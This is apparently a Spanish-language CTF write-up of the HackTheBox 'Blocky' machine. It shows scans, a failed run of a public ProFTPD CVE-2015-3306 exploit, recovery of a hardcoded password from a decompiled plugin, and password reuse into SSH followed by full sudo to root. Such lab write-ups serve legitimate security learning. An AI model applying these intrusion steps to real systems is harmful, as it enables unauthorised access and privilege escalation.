+++
title = "HackTheBox - Blocky"
draft = false
description = "Resolución de la máquina Blocky"
summary = "OS: Linux | Dificultad: Easy | Conceptos: Minecraft, Mods, Java, Wordpress, Usuario en sudoers"
tags = ["HTB", "Linux", "Easy", "Minecraft", "Wordpress", "Sudo"]
categories = ["Writeups"]
showToc = true
showRelated = true
date = "2025-10-16T00:00:00"
+++

* Dificultad: `easy`
* Tiempo aprox. `~1h`
* **Datos Iniciales**: `10.10.10.37`

## Nmap Scan

Tras realizar un escaneo nmap completo, se encuentran los siguientes puertos abiertos:

```shell
PORT      STATE SERVICE   VERSION  
21/tcp    open  ftp       ProFTPD 1.3.5a  
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)  
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)  
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)  
80/tcp    open  http      Apache httpd 2.4.18  
|_http-title: Did not follow redirect to [http://blocky.htb](http://blocky.htb)  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
```

Puertos abiertos:

* `21/TCP` (FTP)
  * Un anonymous login puede funcionar, conviene probarlo.
  * Por otro lado, puede ser que la versión `ProFTPD 1.3.5a` tenga alguna vulnerabilidad.
* `22/TCP` (SSH): Lo común en máquinas HTB.
* `80/TCP` (HTTP): Se menciona algo sobre `blocky.htb`
* `25565/TCP` (Minecraft): Un servidor de Minecraft 1.11.2, para mirar más adelante.

## Análisis Inicial

### FTP

En primer lugar pruebo a conectarme como `anonymous`:

```bash
ftp anonymous@10.10.10.37                        
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
331 Password required for anonymous
Password: [ENTER]
530 Login incorrect.
```

Como se ve, el login anónimo no está disponible. Habrá que seguir mirando.

> [!NOTE]+ Nota: Por qué ha fallado?
> Porque el login anónimo probablemente esté desactivado en los ajustes del servidor de ProFTPD. ProFTPD no permite accesos anónimos por defecto.

Tras buscar la versión `ProFTPD 1.3.5a`, se ve que puede tener una potencial vulnerabilidad (`CVE-2015-3306`), para la que hay exploit publicados, probamos con [uno de ellos](https://github.com/t0kx/exploit-CVE-2015-3306).

```bash
./exploit.py --host blocky.htb --port 21 --path "/var/www/html"
[+] CVE-2015-3306 exploit by t0kx
[+] Exploiting blocky.htb:21
[!] Failed

#Tras probar varias veces, sigue fallando.
```

> [!NOTE]+ Nota: Por qué ha fallado?
> Como dice el propio [readme del exploit](https://github.com/t0kx/exploit-CVE-2015-3306/blob/master/README.md), éste hace uso del módulo de ProFTPD `mod_copy`, un módulo que permite copiar archivos y directorios directamente en el servidor sin tener que descargarlos al cliente y volverlos a subir. Es probable que, simplemente, este módulo estuviese deshabilitado en este caso, y por eso no se haye podido explotar la vulnerabilidad.

### HTTP

Tras copiar a `/etc/hosts` una nueva resolución DNS para `blocky.htb`:

```bash
echo '10.10.10.37 blocky.htb' | sudo tee -a /etc/hosts
```

entro en la página web.

Ahí puede verse una única publicación del usuario `notch` "_We are currently developing a wiki system for the server and a core plugin to track player stats and stuff. Lots of great stuff planned for the future_"

De aquí son revelantes dos cosas:

* Un sistema wiki, del que quizás podemos sacar info.
* Un plugin para guardar estadísticas de usuarios, de donde sí podría sacarse info relevante. (nombres de usuario, etc.)

Tras esto trato de hacer fuzzing de directorios con `gobuster`:

```shell
/wiki (Status: 301) [Size: 307] [--> [http://blocky.htb/wiki/](http://blocky.htb/wiki/)]  
/wp-content (Status: 301) [Size: 313] [--> [http://blocky.htb/wp-content/](http://blocky.htb/wp-content/)]  
/plugins (Status: 301) [Size: 310] [--> [http://blocky.htb/plugins/](http://blocky.htb/plugins/)]  
/wp-includes (Status: 301) [Size: 314] [--> [http://blocky.htb/wp-includes/](http://blocky.htb/wp-includes/)]  
/javascript (Status: 301) [Size: 313] [--> [http://blocky.htb/javascript/](http://blocky.htb/javascript/)]  
/wp-admin (Status: 301) [Size: 311] [--> [http://blocky.htb/wp-admin/](http://blocky.htb/wp-admin/)]  
/phpmyadmin (Status: 301) [Size: 313] [--> [http://blocky.htb/phpmyadmin/](http://blocky.htb/phpmyadmin/)]  
/server-status (Status: 403) [Size: 298]
```

Pruebo a entrar a la Wiki (http://blocky.htb/wiki/): "_Under Construction Please check back later! We will start publishing wiki articles after we have finished the main server plugin! The new core plugin will store your playtime and **other information in our database**, so you can see your own stats!_"

Aquí descubrimos info sobre una base de datos, y sobre que quizás el plugin es más relevante todavía. Entramos en `plugins`:

```java
Name	Last modified	Size	Description
BlockyCore.jar 2017-07-02 10:12 883 	 
griefprevention-1.11.2-3.1.1.298.jar 2017-07-02 18:32 520K	 
```

Encontramos

* `griefprevention-1.11.2-3.1.1.298.jar`: Un plugin de moderación automático.
* `BlockyCore.jar`: El plugin en el que al parecer se está trabajando

## Análisis de Plugins

### Archivos .jar

> Esto no es relevante para la resolución, pero en su momento no sabía qué era un archivo .jar, así que aquí una explicación.

Los archivos `.jar` (`J`ava `AR`chive) son un formato de empaquetado basado en ZIP diseñado para juntar múltiples archivos relacionados con Java en un único comprimido.

* Los `.jar` son completamente independientes de plataforma. Una vez creado, un `.jar` puede ejecutarse en cualquier SO que tenga una JVM compatible.
* Una JVM (Java VM) es una máquina virtual que actúa como un entorno de ejecución capaz de interpretar y ejecutar instrucciones en bytecode Java (archivos `.class`).
* El bytecode es un código de medio nivel generado cuando se compila un archivo `.java`. No es código nativo de ninguna plataforma (Correspondiente a alguna arquitectura de CPU o sistema operativo) específica, sino un código intermedio que solo la JVM entiende. Este bytecode se almacena en archivos `.class` que luego la JVM interpreta y ejecuta.

En resumen:

1. **`.jar`** = ZIPs que almacenan archivos relacionados con java
2. **`JVM`** = Máquina virtual de java que ejecuta archivos en bytecode
3. **`.java`** = Archivos de código fuente en java
4. **`.class`** = Archivos, compilados en bytecode desde `.java`, que la JVM ejecuta.

### Blockycore.jar

Tras abrir el `.jar` para ver su interior, encontramos un archivo `BlockyCore.class`, que podemos decompilar usando la herramienta [CFR](https://www.benf.org/other/cfr/):

```java
/*
 * Decompiled with CFR 0.152.
 */
package com.myfirstplugin;

public class BlockyCore {
    public String sqlHost = "localhost";
    public String sqlUser = "root";
    public String sqlPass = "********"; //Contraseña oculta

    public void onServerStart() {
    }

    public void onServerStop() {
    }

    public void onPlayerJoin() {
        this.sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
    }

    public void sendMessage(String username, String message) {
    }
}
```

Y usando la contraseña encontrada entramos a FTP:

```bash
ftp notch@10.10.10.37
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
331 Password required for notch
Password: ********
230 User notch logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||25044|)
150 Opening ASCII mode data connection for file list
drwxrwxr-x   7 notch    notch        4096 Jul  3  2017 minecraft
-r--------   1 notch    notch          33 Oct 16 10:05 user.txt
226 Transfer complete
ftp> 
```

Aquí encontramos ya el flag de usuario `user.txt`.

En el directorio `minecraft` encontramos todo lo relacionado con el servidor: IPs baneadas, whitelist, configs, registros...

* En un directorio más profundo, de `Nuvotifier` (que resulta ser un plugin para votaciones), encuentro un archivo `config.yaml` que muestra un listener en `localhost:8192` y un token, que podría ser un vector de escalada.
* Encuentro también varias claves para `Nuvotifier`, `public.key` y `private.key`...

## Login inicial y escalada de privilegios.

Tras un rato mirando el directorio de FTP y tras haber probado a iniciar sesión con las claves de `Nuvotifier` por ssh, sigo sin encontrar una contraseña válida, hasta que pruebo a reutilizar la anterior (del `.class` decompilado).

```bash
ssh notch@10.10.10.37
The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.
ED25519 key fingerprint is SHA256:...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/kali/.ssh/known_hosts).
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

notch@Blocky:~$ 
```

Y probamos a ver qué permisos de `sudo` tiene el usuario `notch`:

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL

```

Desde aquí vemos que tenemos permisos `sudo` completos:

```bash
User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Así que simplemente usamos sudo para ser `root`:

```bash
notch@Blocky:~$ sudo -s
root@Blocky:~# 
```

Y lo tenemos.
